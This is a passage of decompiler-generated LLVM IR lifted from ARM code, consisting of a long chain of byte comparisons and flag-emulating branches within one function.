bb1581:                                           ; preds = %bb1580
  store i32 %v4_f284, i32* %r3.global-to-local, align 4
  br label %thread-pre-split204

thread-pre-split204:                              ; preds = %bb1580, %bb1581
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f288 = icmp eq i32 %v4_f284, 0
  store i1 %v2_f288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f288, label %dec_label_pc_f298, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %thread-pre-split204
  %v2_f290 = icmp ugt i32 %v1_e8e8, 231
  store i1 %v2_f290, i1* %cpsr_c.global-to-local, align 1
  %v7_f290 = icmp eq i32 %v1_e8e8, 232
  store i1 %v7_f290, i1* %cpsr_z.global-to-local, align 1
  %v2_f294 = xor i1 %v2_f290, true
  %v3_f294 = or i1 %v7_f290, %v2_f294
  br i1 %v3_f294, label %dec_label_pc_e8d0, label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f290, %thread-pre-split204
  store i32 %.2003, i32* %r3.global-to-local, align 4
  %v2_f29c = icmp ugt i32 %v1_e8e8, 250
  store i1 %v2_f29c, i1* %cpsr_c.global-to-local, align 1
  %v7_f29c = icmp eq i32 %v1_e8e8, 251
  store i1 %v7_f29c, i1* %cpsr_z.global-to-local, align 1
  %v2_f2a0 = xor i1 %v2_f29c, true
  %v3_f2a0 = or i1 %v7_f29c, %v2_f2a0
  br i1 %v3_f2a0, label %bb1582, label %bb1583

bb1582:                                           ; preds = %dec_label_pc_f298
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1583

bb1583:                                           ; preds = %dec_label_pc_f298, %bb1582
  %v4_f2a4 = phi i32 [ %.2003, %dec_label_pc_f298 ], [ 0, %bb1582 ]
  %v2_f2a4 = xor i1 %v7_f29c, true
  %v3_f2a4 = and i1 %v2_f29c, %v2_f2a4
  br i1 %v3_f2a4, label %bb1584, label %thread-pre-split205

bb1584:                                           ; preds = %bb1583
  store i32 %v4_f2a4, i32* %r3.global-to-local, align 4
  br label %thread-pre-split205

thread-pre-split205:                              ; preds = %bb1583, %bb1584
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f2a8 = icmp eq i32 %v4_f2a4, 0
  store i1 %v2_f2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2a8, label %dec_label_pc_f2b8, label %dec_label_pc_f2b0

dec_label_pc_f2b0:                                ; preds = %thread-pre-split205
  %v2_f2b0 = icmp ugt i32 %v1_e8e8, 252
  store i1 %v2_f2b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b0 = icmp eq i32 %v1_e8e8, 253
  store i1 %v7_f2b0, i1* %cpsr_z.global-to-local, align 1
  %v2_f2b4 = xor i1 %v2_f2b0, true
  %v3_f2b4 = or i1 %v7_f2b0, %v2_f2b4
  br i1 %v3_f2b4, label %dec_label_pc_e8d0, label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f2b0, %thread-pre-split205
  %v7_f2b8 = icmp eq i32 %v1_e8d4, 199
  %.2016 = zext i1 %v7_f2b8 to i32
  store i32 %.2016, i32* %r4.global-to-local, align 4
  store i32 %.2016, i32* %r3.global-to-local, align 4
  store i1 %v2_ed00, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ed00, i1* %cpsr_z.global-to-local, align 1
  %v2_f2cc = xor i1 %v2_ed00, true
  %v3_f2cc = or i1 %v7_ed00, %v2_f2cc
  br i1 %v3_f2cc, label %bb1587, label %bb1588

bb1587:                                           ; preds = %dec_label_pc_f2b8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1588

bb1588:                                           ; preds = %dec_label_pc_f2b8, %bb1587
  %v4_f2d0 = phi i32 [ %.2016, %dec_label_pc_f2b8 ], [ 0, %bb1587 ]
  %v2_f2d0 = xor i1 %v7_ed00, true
  %v3_f2d0 = and i1 %v2_ed00, %v2_f2d0
  br i1 %v3_f2d0, label %bb1589, label %thread-pre-split207

bb1589:                                           ; preds = %bb1588
  store i32 %v4_f2d0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split207

thread-pre-split207:                              ; preds = %bb1588, %bb1589
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f2d4 = icmp eq i32 %v4_f2d0, 0
  store i1 %v2_f2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d4, label %dec_label_pc_f2e8, label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %thread-pre-split207
  %v2_f2e0 = icmp ugt i32 %v1_e8e8, 252
  store i1 %v2_f2e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e0 = icmp eq i32 %v1_e8e8, 253
  store i1 %v7_f2e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f2e4 = xor i1 %v2_f2e0, true
  %v3_f2e4 = or i1 %v7_f2e0, %v2_f2e4
  br i1 %v3_f2e4, label %dec_label_pc_e8d0, label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2e0, %thread-pre-split207
  store i32 %v0_ff48, i32* %r3.global-to-local, align 4
  %v2_f2ec = icmp ugt i32 %v1_e8d4, 204
  store i1 %v2_f2ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f2ec = icmp eq i32 %v1_e8d4, 205
  store i1 %v7_f2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2ec, label %.thread208, label %.thread209

.thread209:                                       ; preds = %dec_label_pc_f2e8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f308

.thread208:                                       ; preds = %dec_label_pc_f2e8
  store i32 %v0_ff48, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f2f8 = icmp eq i32 %v0_ff48, 0
  store i1 %v2_f2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2f8, label %dec_label_pc_f308, label %dec_label_pc_f300

dec_label_pc_f300:                                ; preds = %.thread208
  %v2_f300 = icmp ugt i32 %v1_e8e8, 116
  store i1 %v2_f300, i1* %cpsr_c.global-to-local, align 1
  %v7_f300 = icmp eq i32 %v1_e8e8, 117
  store i1 %v7_f300, i1* %cpsr_z.global-to-local, align 1
  %v2_f304 = xor i1 %v2_f300, true
  %v3_f304 = or i1 %v7_f300, %v2_f304
  br i1 %v3_f304, label %dec_label_pc_e8d0, label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %.thread209, %dec_label_pc_f300, %.thread208
  store i32 %.1996, i32* %r3.global-to-local, align 4
  store i1 %v2_ec50, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec50, i1* %cpsr_z.global-to-local, align 1
  %v2_f310 = xor i1 %v2_ec50, true
  %v3_f310 = or i1 %v7_ec50, %v2_f310
  br i1 %v3_f310, label %bb1590, label %bb1591

bb1590:                                           ; preds = %dec_label_pc_f308
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1591

bb1591:                                           ; preds = %dec_label_pc_f308, %bb1590
  %v4_f314 = phi i32 [ %.1996, %dec_label_pc_f308 ], [ 0, %bb1590 ]
  %v2_f314 = xor i1 %v7_ec50, true
  %v3_f314 = and i1 %v2_ec50, %v2_f314
  br i1 %v3_f314, label %bb1592, label %thread-pre-split212

bb1592:                                           ; preds = %bb1591
  store i32 %v4_f314, i32* %r3.global-to-local, align 4
  br label %thread-pre-split212

thread-pre-split212:                              ; preds = %bb1591, %bb1592
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f318 = icmp eq i32 %v4_f314, 0
  store i1 %v2_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f318, label %dec_label_pc_f328, label %dec_label_pc_f320

dec_label_pc_f320:                                ; preds = %thread-pre-split212
  %v2_f320 = icmp ugt i32 %v1_e8e8, 60
  store i1 %v2_f320, i1* %cpsr_c.global-to-local, align 1
  %v7_f320 = icmp eq i32 %v1_e8e8, 61
  store i1 %v7_f320, i1* %cpsr_z.global-to-local, align 1
  %v2_f324 = xor i1 %v2_f320, true
  %v3_f324 = or i1 %v7_f320, %v2_f324
  br i1 %v3_f324, label %dec_label_pc_e8d0, label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f320, %thread-pre-split212
  store i32 %v0_f338, i32* %r3.global-to-local, align 4
  %v2_f32c = icmp ugt i32 %v1_e8d4, 103
  store i1 %v2_f32c, i1* %cpsr_c.global-to-local, align 1
  %v7_f32c = icmp eq i32 %v1_e8d4, 104
  %.2017 = zext i1 %v7_f32c to i32
  %v2_f338 = and i32 %v0_f338, %.2017
  %v4_f338 = icmp eq i32 %v2_f338, 0
  store i1 %v4_f338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f338, label %dec_label_pc_f34c, label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %dec_label_pc_f328
  store i1 %v2_ec94, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ef6c, label %dec_label_pc_e8d0, label %dec_label_pc_f34c

dec_label_pc_f34c:                                ; preds = %dec_label_pc_f344, %dec_label_pc_f328
  %v7_f34c = icmp eq i32 %v1_e8d4, 188
  %.2018 = zext i1 %v7_f34c to i32
  store i32 %.2018, i32* %r4.global-to-local, align 4
  %v2_f358 = icmp ugt i32 %v1_e8e8, 165
  store i1 %v2_f358, i1* %cpsr_c.global-to-local, align 1
  %v7_f358 = icmp eq i32 %v1_e8e8, 166
  store i1 %v7_f358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f358, label %bb1597, label %dec_label_pc_f368

bb1597:                                           ; preds = %dec_label_pc_f34c
  %v2_f34c = icmp ugt i32 %v1_e8d4, 187
  store i1 %v2_f34c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f34c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f34c, label %dec_label_pc_e8d0, label %dec_label_pc_f368

dec_label_pc_f368:                                ; preds = %dec_label_pc_f34c, %bb1597
  store i32 %.2018, i32* %r3.global-to-local, align 4
  %v2_f36c = icmp ugt i32 %v1_e8e8, 225
  store i1 %v2_f36c, i1* %cpsr_c.global-to-local, align 1
  %v7_f36c = icmp eq i32 %v1_e8e8, 226
  store i1 %v7_f36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f36c, label %.thread220, label %.thread221

.thread221:                                       ; preds = %dec_label_pc_f368
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f380

.thread220:                                       ; preds = %dec_label_pc_f368
  store i32 %.2018, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f378 = icmp eq i1 %v7_f34c, false
  store i1 %v2_f378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f378, label %dec_label_pc_f380, label %dec_label_pc_e8d0

dec_label_pc_f380:                                ; preds = %.thread221, %.thread220
  %v2_f380 = icmp ugt i32 %v1_e8e8, 202
  store i1 %v2_f380, i1* %cpsr_c.global-to-local, align 1
  %v7_f380 = icmp eq i32 %v1_e8e8, 203
  store i1 %v7_f380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f380, label %.thread224, label %.thread225

.thread225:                                       ; preds = %dec_label_pc_f380
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f394

.thread224:                                       ; preds = %dec_label_pc_f380
  store i32 %.2013, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f38c = icmp eq i1 %v7_f1b4, false
  store i1 %v2_f38c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f38c, label %dec_label_pc_f394, label %dec_label_pc_e8d0

dec_label_pc_f394:                                ; preds = %.thread225, %.thread224
  store i32 %.1988, i32* %r3.global-to-local, align 4
  %v2_f398 = icmp ugt i32 %v1_e8e8, 242
  store i1 %v2_f398, i1* %cpsr_c.global-to-local, align 1
  %v7_f398 = icmp eq i32 %v1_e8e8, 243
  store i1 %v7_f398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f398, label %.thread228, label %.thread229

.thread229:                                       ; preds = %dec_label_pc_f394
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f3ac

.thread228:                                       ; preds = %dec_label_pc_f394
  store i32 %.1988, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3a4 = icmp eq i1 %v7_eb40, false
  store i1 %v2_f3a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_e8d0

dec_label_pc_f3ac:                                ; preds = %.thread229, %.thread228
  %v2_f3b0 = icmp ugt i32 %v1_e8d4, 44
  store i1 %v2_f3b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b0 = icmp eq i32 %v1_e8d4, 45
  %.2019 = zext i1 %v7_f3b0 to i32
  %v2_f3bc = and i32 %.1997, %.2019
  %v4_f3bc = icmp eq i32 %v2_f3bc, 0
  store i1 %v4_f3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f3bc, label %dec_label_pc_f3c8, label %dec_label_pc_e8d0

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3ac
  %v7_f3c8 = icmp eq i32 %v1_e8d4, 178
  %.2020 = zext i1 %v7_f3c8 to i32
  store i32 %.2020, i32* %r3.global-to-local, align 4
  %v2_f3d4 = icmp ugt i32 %v1_e8e8, 61
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d4 = icmp eq i32 %v1_e8e8, 62
  %storemerge1255 = zext i1 %v7_f3d4 to i32
  store i32 %storemerge1255, i32* %r4.global-to-local, align 4
  %v2_f3e0 = and i32 %storemerge1255, %.2020
  %v4_f3e0 = icmp eq i32 %v2_f3e0, 0
  store i1 %v4_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f3e0, label %dec_label_pc_f3f0, label %dec_label_pc_e8d0

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3c8
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 %v2_f1e8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f1e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e8, label %.thread235, label %.thread236

.thread236:                                       ; preds = %dec_label_pc_f3f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f408

.thread235:                                       ; preds = %dec_label_pc_f3f0
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f400 = icmp eq i1 %v7_f32c, false
  store i1 %v2_f400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f400, label %dec_label_pc_f408, label %dec_label_pc_e8d0

dec_label_pc_f408:                                ; preds = %.thread236, %.thread235
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_f40c = icmp ugt i32 %v1_e8e8, 235
  store i1 %v2_f40c, i1* %cpsr_c.global-to-local, align 1
  %v7_f40c = icmp eq i32 %v1_e8e8, 236
  store i1 %v7_f40c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f40c, label %.thread239, label %.thread240

.thread240:                                       ; preds = %dec_label_pc_f408
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f420

.thread239:                                       ; preds = %dec_label_pc_f408
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f418 = icmp eq i1 %v7_f32c, false
  store i1 %v2_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f418, label %dec_label_pc_f420, label %dec_label_pc_e8d0

dec_label_pc_f420:                                ; preds = %.thread240, %.thread239
  %v7_f420 = icmp eq i32 %v1_e8d4, 107
  %.2021 = zext i1 %v7_f420 to i32
  %v2_f42c = icmp ugt i32 %v1_e8e8, 169
  store i1 %v2_f42c, i1* %cpsr_c.global-to-local, align 1
  %v7_f42c = icmp eq i32 %v1_e8e8, 170
  %storemerge1257 = zext i1 %v7_f42c to i32
  %v2_f438 = and i32 %storemerge1257, %.2021
  %v4_f438 = icmp eq i32 %v2_f438, 0
  store i1 %v4_f438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f438, label %dec_label_pc_f448, label %dec_label_pc_e8d0

dec_label_pc_f448:                                ; preds = %dec_label_pc_f420
  store i32 %.2008, i32* %r3.global-to-local, align 4
  store i1 %v2_f06c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f06c, label %.thread245, label %.thread246

.thread246:                                       ; preds = %dec_label_pc_f448
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f460

.thread245:                                       ; preds = %dec_label_pc_f448
  store i32 %.2008, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f458 = icmp eq i1 %v7_ef28, false
  store i1 %v2_f458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f458, label %dec_label_pc_f460, label %dec_label_pc_e8d0

dec_label_pc_f460:                                ; preds = %.thread246, %.thread245
  store i32 %.1992, i32* %r3.global-to-local, align 4
  store i32 %.2008, i32* %r4.global-to-local, align 4
  %v2_f468 = and i32 %.1992, %.2008
  %v4_f468 = icmp eq i32 %v2_f468, 0
  store i1 %v4_f468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f468, label %dec_label_pc_f470, label %dec_label_pc_e8d0

dec_label_pc_f470:                                ; preds = %dec_label_pc_f460
  %v2_f478 = and i32 %.1994, %.2009
  %v4_f478 = icmp eq i32 %v2_f478, 0
  store i1 %v4_f478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f478, label %dec_label_pc_f480, label %dec_label_pc_e8d0

dec_label_pc_f480:                                ; preds = %dec_label_pc_f470
  %v2_f480 = icmp ugt i32 %v1_e8e8, 184
  store i1 %v2_f480, i1* %cpsr_c.global-to-local, align 1
  %v7_f480 = icmp eq i32 %v1_e8e8, 185
  store i1 %v7_f480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f480, label %.thread249, label %.thread250

.thread250:                                       ; preds = %dec_label_pc_f480
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4a8

.thread249:                                       ; preds = %dec_label_pc_f480
  store i32 %.1976, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f48c = icmp eq i1 %v7_e990, false
  store i1 %v2_f48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f48c, label %dec_label_pc_f4a8, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %.thread249
  %v2_f494 = icmp ugt i32 %v1_e8ec, 189
  store i1 %v2_f494, i1* %cpsr_c.global-to-local, align 1
  %v7_f494 = icmp eq i32 %v1_e8ec, 190
  store i1 %v7_f494, i1* %cpsr_z.global-to-local, align 1
  %v2_f498 = xor i1 %v7_f494, true
  %v3_f498 = and i1 %v2_f494, %v2_f498
  br i1 %v3_f498, label %bb1608, label %bb1609

bb1608:                                           ; preds = %dec_label_pc_f494
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1609

bb1609:                                           ; preds = %dec_label_pc_f494, %bb1608
  %v0_f4a0895 = phi i32 [ %.1976, %dec_label_pc_f494 ], [ 0, %bb1608 ]
  %v2_f49c = xor i1 %v2_f494, true
  %v3_f49c = or i1 %v7_f494, %v2_f49c
  br i1 %v3_f49c, label %bb1610, label %bb1611

bb1610:                                           ; preds = %bb1609
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1611

bb1611:                                           ; preds = %bb1609, %bb1610
  %v0_f4a0 = phi i32 [ %v0_f4a0895, %bb1609 ], [ 1, %bb1610 ]
  %v2_f4a0 = and i32 %v3_e8dc, 64
  %v3_f4a0 = icmp ne i32 %v2_f4a0, 0
  store i1 %v3_f4a0, i1* %cpsr_c.global-to-local, align 1
  %v4_f4a0 = udiv i32 %v1_e8ec, 128
  %v5_f4a0 = and i32 %v0_f4a0, %v4_f4a0
  store i32 %v5_f4a0, i32* %r3.global-to-local, align 4
  %v6_f4a0 = icmp eq i32 %v5_f4a0, 0
  store i1 %v6_f4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f4a0, label %dec_label_pc_f4a8, label %dec_label_pc_e8d0

dec_label_pc_f4a8:                                ; preds = %.thread250, %bb1611, %.thread249
  %v2_f4a8 = icmp ugt i32 %v1_e8e8, 46
  store i1 %v2_f4a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a8 = icmp eq i32 %v1_e8e8, 47
  %.2022 = zext i1 %v7_f4a8 to i32
  store i32 %.2022, i32* @r6, align 4
  %v2_f4b4 = and i32 %.2022, %.2015
  %v4_f4b4 = icmp eq i32 %v2_f4b4, 0
  store i1 %v4_f4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f4b4, label %dec_label_pc_f4d8, label %dec_label_pc_f4bc

dec_label_pc_f4bc:                                ; preds = %dec_label_pc_f4a8
  %v2_f4bc = icmp ugt i32 %v1_e8ec, 8
  store i1 %v2_f4bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4bc = icmp eq i32 %v1_e8ec, 9
  store i1 %v7_f4bc, i1* %cpsr_z.global-to-local, align 1
  %v2_f4c0 = xor i1 %v2_f4bc, true
  %v3_f4c0 = or i1 %v7_f4bc, %v2_f4c0
  br i1 %v3_f4c0, label %bb1614, label %bb1615

bb1614:                                           ; preds = %dec_label_pc_f4bc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1615

bb1615:                                           ; preds = %dec_label_pc_f4bc, %bb1614
  %v2_f4c4 = xor i1 %v7_f4bc, true
  %v3_f4c4 = and i1 %v2_f4bc, %v2_f4c4
  br i1 %v3_f4c4, label %bb1616, label %bb1617

bb1616:                                           ; preds = %bb1615
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1617

bb1617:                                           ; preds = %bb1615, %bb1616
  %v0_f4d0.pr = phi i32 [ 0, %bb1615 ], [ 1, %bb1616 ]
  %v2_f4c8 = icmp ugt i32 %v1_e8ec, 9
  store i1 %v2_f4c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c8 = icmp eq i32 %v1_e8ec, 10
  store i1 %v7_f4c8, i1* %cpsr_z.global-to-local, align 1
  %v2_f4cc = xor i1 %v7_f4c8, true
  %v3_f4cc = and i1 %v2_f4c8, %v2_f4cc
  br i1 %v3_f4cc, label %.thread255, label %bb1618

.thread255:                                       ; preds = %bb1617
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4d8

bb1618:                                           ; preds = %bb1617
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4d0 = icmp eq i32 %v0_f4d0.pr, 0
  store i1 %v2_f4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4d0, label %dec_label_pc_f4d8, label %dec_label_pc_e8d0

dec_label_pc_f4d8:                                ; preds = %.thread255, %bb1618, %dec_label_pc_f4a8
  %v2_f4d8 = icmp ugt i32 %v1_e8d4, 173
  store i1 %v2_f4d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d8 = icmp eq i32 %v1_e8d4, 174
  store i1 %v7_f4d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d8, label %bb1619, label %dec_label_pc_f4fc

bb1619:                                           ; preds = %dec_label_pc_f4d8
  %v3_f4dc = icmp ugt i32 %v1_e8e8, 137
  store i1 %v3_f4dc, i1* %cpsr_c.global-to-local, align 1
  %v8_f4dc = icmp eq i32 %v1_e8e8, 138
  store i1 %v8_f4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4dc, label %dec_label_pc_f4e4, label %dec_label_pc_f4fc

dec_label_pc_f4e4:                                ; preds = %bb1619
  store i32 %v1_e8ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4e4 = icmp eq i32 %v1_e8ec, 0
  store i1 %v2_f4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4e4, label %bb1621, label %bb1620

bb1620:                                           ; preds = %dec_label_pc_f4e4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1621

bb1621:                                           ; preds = %dec_label_pc_f4e4, %bb1620
  %v0_f4f4.pr = phi i32 [ 0, %dec_label_pc_f4e4 ], [ 1, %bb1620 ]
  %v2_f4ec = icmp ugt i32 %v1_e8ec, 125
  store i1 %v2_f4ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f4ec = icmp eq i32 %v1_e8ec, 126
  store i1 %v7_f4ec, i1* %cpsr_z.global-to-local, align 1
  %v2_f4f0 = xor i1 %v7_f4ec, true
  %v3_f4f0 = and i1 %v2_f4ec, %v2_f4f0
  br i1 %v3_f4f0, label %.thread260, label %bb1622

.thread260:                                       ; preds = %bb1621
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4fc

bb1622:                                           ; preds = %bb1621
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4f4 = icmp eq i32 %v0_f4f4.pr, 0
  store i1 %v2_f4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4f4, label %dec_label_pc_f4fc, label %dec_label_pc_e8d0

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4d8, %.thread260, %bb1622, %bb1619
  %v2_f4fc = icmp ugt i32 %v1_e8e8, 240
  store i1 %v2_f4fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4fc = icmp eq i32 %v1_e8e8, 241
  store i1 %v7_f4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4fc, label %.thread263, label %.thread264

.thread264:                                       ; preds = %dec_label_pc_f4fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f520

.thread263:                                       ; preds = %dec_label_pc_f4fc
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f508 = icmp eq i1 %v7_e978, false
  store i1 %v2_f508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f508, label %dec_label_pc_f520, label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %.thread263
  %v1_f510 = add nsw i32 %v1_e8ec, -255
  store i32 %v1_f510, i32* %r3.global-to-local, align 4
  %v2_f510 = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_f510, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f510, label %bb1624, label %bb1623

bb1623:                                           ; preds = %dec_label_pc_f510
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1624

bb1624:                                           ; preds = %dec_label_pc_f510, %bb1623
  %v0_f518 = phi i32 [ %v1_f510, %dec_label_pc_f510 ], [ 1, %bb1623 ]
  %v2_f518 = and i32 %v3_e8dc, 64
  %v3_f518 = icmp ne i32 %v2_f518, 0
  store i1 %v3_f518, i1* %cpsr_c.global-to-local, align 1
  %v4_f518 = udiv i32 %v1_e8ec, 128
  %v5_f518 = and i32 %v0_f518, %v4_f518
  store i32 %v5_f518, i32* %r3.global-to-local, align 4
  %v6_f518 = icmp eq i32 %v5_f518, 0
  store i1 %v6_f518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f518, label %dec_label_pc_f520, label %dec_label_pc_e8d0

dec_label_pc_f520:                                ; preds = %.thread264, %bb1624, %.thread263
  store i32 %.2004, i32* %r3.global-to-local, align 4
  %v2_f524 = icmp ugt i32 %v1_e8e8, 198
  store i1 %v2_f524, i1* %cpsr_c.global-to-local, align 1
  %v7_f524 = icmp eq i32 %v1_e8e8, 199
  store i1 %v7_f524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f524, label %.thread267, label %.thread268

.thread268:                                       ; preds = %dec_label_pc_f520
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f554

.thread267:                                       ; preds = %dec_label_pc_f520
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f530 = icmp eq i1 %v7_edd4, false
  store i1 %v2_f530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f530, label %dec_label_pc_f554, label %dec_label_pc_f538

